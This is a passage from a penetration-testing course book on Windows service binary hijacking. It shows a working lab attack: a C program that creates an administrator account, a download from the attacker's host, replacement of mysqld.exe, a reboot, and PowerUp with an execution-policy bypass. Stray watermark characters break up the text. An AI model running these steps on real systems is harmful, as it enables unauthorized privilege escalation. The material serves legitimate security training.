Listing 411 - List of services with binary path
i
Based on the output in Listing 41z1, the two XAMPP services Apache2.4 and mysql stand out as
the binaries are located in the C:\xampp\ directory instead of C:\Windows\System32. This means
the service is user-installed and the software developer is in charge of the directory structure as
D
well as permissions of the software. These circumstances make it potentially prone to service
binary hijacking.
Next, let’s enumerate the permissions on both service binaries. We can choose between the
traditional icacls Windows utility or the PowerShell Cmdlet Get-ACL.789 For this example, we’ll use
icacls since it usable both in PowerShell and the Windows command line.
The icacls utility outputs the corresponding principals and their permission mask.790 The most
relevant permissions and their masks are listed below:
Mask Permissions
F Full access
M Modify access
RX Read and execute access
R Read-only access
W Write-only access
789 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-
acl?view=powershell-7.2
790 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 501
Made in Morocco
Penetration Testing with Kali Linux
Listing 412 - icacls permissions mask
Let’s use icacls on the Apache binary httpd.exe first.
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
NT AUTHORITY\SYSTEM:(F)
BUILTIN\Users:(RX)
NT AUTHORITY\Authenticated Users:(RX)
Successfully processed 1 files; Failed processing 0 files
Listing 413 - Permissions of httpd.exe
As member of the built-in Users group, dave only has Read and Execute (RX) rights on httpd.exe,
meaning we cannot replace the file with a malicious binary.
y
Next, we’ll check mysqld.exe from the mysql service.
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"k
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
s
BUILTIN\Users:(F)
Successfully processed 1 files; Failed processing 0 files
o
Listing 414 - Permissions of mysqld.exe
The output of Listing 414 shows that members of the Users group have the Full Access (F)
n
permission, allowing us to write to and modify the binary and therefore, replace it. Due to the
missing indicator (I) preceding this permission, we know that it was set on purpose and not
inherited by the parent directory. Aidministrators often set Full Access permissions when they
configure a service and are not zentirely sure about the required permissions. Setting it to Full
Access avoids most permission problems, but creates a security risk as we’ll show in this
example. D
Let’s create a small binary on Kali, which we’ll use to replace the original mysqld.exe. The
following C code will create a user named dave2 and add that user to the local Administrators
group using the system791 function. The cross-compiled version of this code will serve as our
malicious binary. Let’s save it on Kali in a file named adduser.c.
#include 
int main ()
{
int i;
i = system ("net user dave2 password123! /add");
i = system ("net localgroup administrators dave2 /add");
return 0;
}
Listing 415 - adduser.c code
791 (Man7, 2022), https://man7.org/linux/man-pages/man3/system.3.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 502
Made in Morocco
Penetration Testing with Kali Linux
Next, we’ll cross-compile792 the code on our Kali machine with mingw-64 as we learned in the
Module “Fixing Exploits”. Since we know that the target machine is 64-bit, we’ll cross-compile the
C code to a 64-bit application with x86_64-w64-mingw32-gcc. In addition, we use adduser.exe as
argument for -o to specify the name of the compiled executable.
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
Listing 416 - Cross-Compile the C Code to a 64-bit application
Once adduser.exe is cross-compiled, we can transfer it to our target and replace the original
mysqld.exe binary with our malicious copy.
For this, we start a Python3 web server in the output directory of adduser.exe on our Kali machine
and use iwr on the target machine in a PowerShell window to download our executable file. In
addition, we move the original mysqld.exe to our home directory. This way, we can restore the
service binary after a successful privilege escalation attempt.
y
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
k
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
s
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
Listing 417 - Replacing mysqld.exe with our malicious binary
o
In order to execute the binary through the service, we need to restart it. We can use the net stop
command to stop the service.
n
PS C:\Users\dave> net stop mysql
System error 5 has occurred.
i
Access is denied. z
Listing 418 - Attempting to stop the service in order to restart it
Unfortunately, dave doesn’tD have sufficient permissions to stop the service. This is expected as
most services are only managed by administrative users.
Since we do not have permission to manually restart the service, we must consider another
approach. If the service Startup Type is set to “Automatic”, we may be able to restart the service
by rebooting the machine.
Let’s check the Startup Type of the mysql service with the help of the Get-CimInstance Cmdlet by
selecting Name and StartMode as well as filter for the string “mysql” with Where-Object.
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode |
Where-Object {$_.Name -like 'mysql'}
Name StartMode
---- ---------
mysql Auto
Listing 419 - Obtain Startup Type for mysql service
792 (GNU, 2022), https://www.gnu.org/software/automake/manual/html_node/Cross_002dCompilation.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 503
Made in Morocco
Penetration Testing with Kali Linux
Listing 419 shows that the service is set to Auto, meaning it will start automatically after a reboot.
In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege793 assigned.
We can use whoami with /priv to get a list of all privileges.
PS C:\Users\dave> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ==================================== ========
SeSecurityPrivilege Manage auditing and security log Disabled
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set y Disabled
SeTimeZonePrivilege Change the time zone Disabled
Listing 420 - Checking for reboot privileges
k
Listing 420 shows that our user has the privilege in question (among others) and therefore, we
should be able to initiate a system shutdown or reboots. The Disabled state only indicates if the
privilege is currently enabled for the running process. In our case, it means that whoami has not
requested and is not currently using the SeShutdownPrivilege privilege.
o
If the SeShutdownPrivilege privilege was not present, we would have to wait for the victim to
manually start the service, which would be much less convenient.
n
We can issue a reboot with shutdown and the arguments /r (reboot instead of shutdown) and /t 0
(in zero seconds). i
z
We should always try to avoid issuing reboots on production systems in a real-
D
life penetration test. A reboot could lead to unforeseeable problems and should
only be issued in direct collaboration with the client’s IT staff. If a system doesn’t
boot up after we reboot, this could disrupt our client’s day-to-day business and
even cause long-term downtime of the infrastructure. This is especially the case
in a situation when there is no current backup available.
PS C:\Users\dave> shutdown /r /t 0
Listing 421 - Rebooting the machine
Once the reboot is complete, we connect again as dave via RDP and open a PowerShell window.
Because of the issued reboot and the Startup type auto, the service should have executed the
executable file we placed to replace the original mysql service binary.
To confirm that our attack worked, let’s list the members of the local Administrators group with
Get-LocalGroupMember to check if dave2 was created and added to it.
793 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-
settings/user-rights-assignment
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 504
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\dave> Get-LocalGroupMember administrators
ObjectClass Name PrincipalSource
----------- ---- ---------------
User CLIENTWK220\Administrator Local
User CLIENTWK220\BackupAdmin Local
User CLIENTWK220\dave2 Local
User CLIENTWK220\daveadmin Local
User CLIENTWK220\offsec Local
Listing 422 - Display members of the local administrators group
Listing 422 shows that dave2 was created and added to the local Administrators group. Great!
As in the previous sections, we can use RunAs to obtain an interactive shell. In addition, we could
also use msfvenom794 to create an executable file, starting a reverse shell.
y
To restore the original state of the service, we have to delete our binary mysqld.exe, restore the
backed up original binary, and restart the system.
k
Before we conclude this section, let’s review an automated tool named PowerUp.ps1795 and check
if it detects this privilege escalation vector. To do so, we copy the script to kali’s home directory
s
and start a Python3 web server to serve it.
o
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
kali@kali:~$ python3 -m http.server 80
n
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
Listing 423 - Copy PowerUp.ps1 to kali’s home directory and serve it with a Python3 web server
i
On the target machine, we download it as dave with iwr in PowerShell and start powershell with
z
the ExecutionPolicy Bypass. Otherwise, it won’t be possible to run scripts as they are blocked.
After we import PowerUp.ps1, we can use Get-ModifiableServiceFile. This function displays
D
services the current user can modify, such as the service binary or configuration files.
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableServiceFile
...
ServiceName : mysql
Path : C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes,
Synchronize...}
794 (OffSec, 2023), https://www.offensive-security.com/metasploit-unleashed/msfvenom/
795 (Github, 2017), https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 505
Made in Morocco
Penetration Testing with Kali Linux
ModifiableFileIdentityReference : BUILTIN\Users
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 'mysql'
CanRestart : False
Listing 424 - Import PowerUp.ps1 and execute Get-ModifiableServiceFile
The output of Get-ModifiableServiceFile shows us that PowerUp identified mysql (among others)
to be vulnerable. In addition, it provides information about the file path, the principal
(BUILTIN\Users group), and if we have permissions to restart the service (False).
PowerUp also provides us an AbuseFunction, which is a built-in function to replace the binary and,
if we have sufficient permissions, restart it. The default behavior is to create a new local user
called john with the password Password123! and add it to the local Administrators group.
Because we don’t have enough permissions to restart the service, we still need to reboot the
machine.
y
However, if we use the AbuseFunction Install-ServiceBinary with the service name, we receive an
error. k
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
s
Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
o
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+ throw "Service binary '$(n$ServiceDetails.PathName)' for s ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : OperationStopped: (Service binary ...e current
user.:String) [], RuntimeExceptiion
+ FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --
z
defaults-file=c:\xampp\mysql\bin\my.ini
mysql' for service mysql not modifiable by the current user.
D Listing 425 - Error from AbuseFunction
The output states that the service binary file is not modifiable by the current user. However, we
already established that we have Full Access permissions on the service binary and
demonstrated that we could replace the file manually.
Reviewing the code796 of PowerUp and checking the outputs of the commands used in Get-
ModifiableServiceFile, we identify that Get-ModifiablePath is used to return modifiable paths for
the current user. However, for us, it provides an empty result, leading to the above error.
Let’s examine this behavior in order to understand why AbuseFunction is throwing an error. First,
we’ll try the service binary path without any arguments for Get-ModifiablePath. Then, we’ll add
another argument to check if the function still provides the correct output. Finally, we’ll use an
argument with a path inside.
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-
ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
796 (Github, 2017), https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 506
Made in Morocco
Penetration Testing with Kali Linux
ModifiablePath IdentityReference Permissions
-------------- ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users {WriteOwner, Delete, WriteAttributes,
Synchronize...}
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' |
Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
ModifiablePath IdentityReference Permissions
-------------- ----------------- -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes,
Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite,
GenericExecute, GenericRead} y
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -
conf=C:\test\path' | Get-ModifiablePath -Literal k
PS C:\Users\dave> $ModifiableFiles
s
Listing 426 - Analyzing the function ModifiablePath
Listing 426 shows that while the service binaryo with or without another argument works as
expected, a path as an argument creates an empty result. Because the mysql service specifies
the argument C:\xampp\mysql\bin\my.ini for defaults-file in the service binary path displayed in
Listing 411, the AbuseFunction throws an enrror. In a situation like this, we should use the result of
the identified vulnerable service file and do a manual exploitation as we did in this section.
i
Our investigation shows that we should never blindly trust or rely on the output of automated
z
tools. However, PowerUp is a great tool to identify potential privilege escalation vectors, which
can be used to automatically check if the vulnerability can be exploited. If this is not the case, we
should do some manual aDnalysis if the potential vector is not vulnerable or the AbuseFunction
just cannot exploit it.
In this section, we first enumerated services and their binary permissions. After we identified that
the group Users, and therefore, our user dave, has Full Access to the binary mysqld.exe, we cross-
compiled a small binary creating an administrative user named dave2. After we copied it to the
target system, we replaced mysqld.exe with our binary. Since we couldn’t restart the service, we
needed to reboot the system. After the system was rebooted, the service mysql started and dave2
was created and added to the local group Administrators.
16.2.2 Service DLL Hijacking
Replacing the binary of a service is a very effective way to attempt privilege escalation on
Windows systems. However, because our user doesn’t often have permissions to replace these